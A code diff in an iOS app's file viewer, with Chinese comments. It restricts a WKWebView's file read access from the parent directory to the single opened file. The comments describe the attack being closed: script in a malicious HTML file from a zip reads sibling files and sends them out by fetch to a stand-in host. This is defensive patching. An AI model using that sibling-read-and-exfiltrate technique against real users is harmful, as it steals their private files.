@@ -325,7 +325,12 @@ static UIWindow *_previousKeyWindow = nil;
         [self loadPlainTextFile];
     } else {
         // HTML 及其它可由 WebKit 直接渲染的文件: 按真实网页加载(不转义)。
-        [self.webView loadFileURL:self.fileURL allowingReadAccessToURL:self.fileURL.URLByDeletingLastPathComponent];
+        // allowingReadAccessToURL 收紧到自己的文件:
+        //   原本传 self.fileURL.URLByDeletingLastPathComponent (整个父目录),JS 可
+        //   fetch('./sibling') 读到 zip 解压后同目录的全部文件,再 fetch('https://x') 外发。
+        //   攻击者发一个含恶意 .html 的 zip 即可窃取同 zip 内其它文件 (review 提示)。
+        //   收紧到 fileURL 自己后, JS 仍能跑 (报表/图表), 但跨文件读被切断。
+        [self.webView loadFileURL:self.fileURL allowingReadAccessToURL:self.fileURL];
     }
     [self.view addSubview:self.webView];
 
